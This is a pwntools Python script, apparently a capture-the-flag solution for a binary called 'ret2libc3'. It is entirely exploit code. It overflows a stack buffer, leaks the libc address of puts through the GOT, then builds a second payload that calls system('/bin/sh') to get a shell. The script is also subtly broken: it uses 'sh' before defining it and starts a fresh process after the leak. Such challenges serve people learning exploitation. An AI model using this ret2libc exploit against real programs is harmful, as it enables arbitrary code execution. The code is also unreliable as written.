from pwn import *

elf_pro = ELF('./ret2libc3')
elf_libc = ELF('/usr/lib32/libc.so.6')
padding = 0x6c+4


got_puts = elf_pro.got['puts']

start = elf_pro.symbols['_start']
plt_put = elf_pro.plt['puts']
padding_len = 0x6c+4
print('pltput:%x'%plt_put)

print('start:%x'%start)

payload1 = b'a'*padding_len + p32(plt_put) + p32(start) + p32(got_puts)
#payload1 = flat([b'A'*padding_len,plt_put,start,got_pro_start_main])

sh.sendlineafter('Can you find it !?',payload1)
libc_pro_addr = u32(sh.recv()[0:4])
#libc_pro_addr = 0xf7c731b0
print('%x'%libc_pro_addr)

sh = process('./ret2libc3')
libc_puts = elf_libc.symbols['puts']
offset = libc_pro_addr-libc_puts

libc_binsh =offset + next(elf_libc.search(b'/bin/sh'))
libc_system = offset + elf_libc.symbols['system']

payload2 = b'a'*padding_len + p32(libc_system) + p32(0x11111111) + p32(libc_binsh)
sh.sendline(payload2)
sh.interactive()
